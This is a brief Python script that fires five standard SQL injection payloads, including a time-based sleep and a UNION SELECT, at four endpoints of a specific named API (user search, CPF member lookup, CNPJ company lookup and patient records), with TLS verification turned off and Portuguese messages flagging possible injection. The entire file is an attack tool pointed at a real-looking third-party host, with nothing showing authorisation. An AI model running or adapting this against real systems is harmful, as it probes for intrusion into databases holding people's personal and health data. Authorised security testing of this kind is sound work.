#!/usr/bin/env python3
import requests

sqli_payloads = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "1' AND sleep(5)--",
    "' UNION SELECT null,null,null--"
]

endpoints = [
    "https://api.homolodoc.com.br/User/search?q=",
    "https://api.homolodoc.com.br/Member/search?cpf=",
    "https://api.homolodoc.com.br/Company/get/cnpj?cnpj=",
    "https://api.homolodoc.com.br/patient/get?id="
]

for endpoint in endpoints:
    print(f"\n[*] Testando: {endpoint}")
    for payload in sqli_payloads:
        r = requests.get(endpoint + payload, verify=False)
        if "error" in r.text.lower() or "sql" in r.text.lower():
            print(f"[!] Possível SQLi com: {payload}")
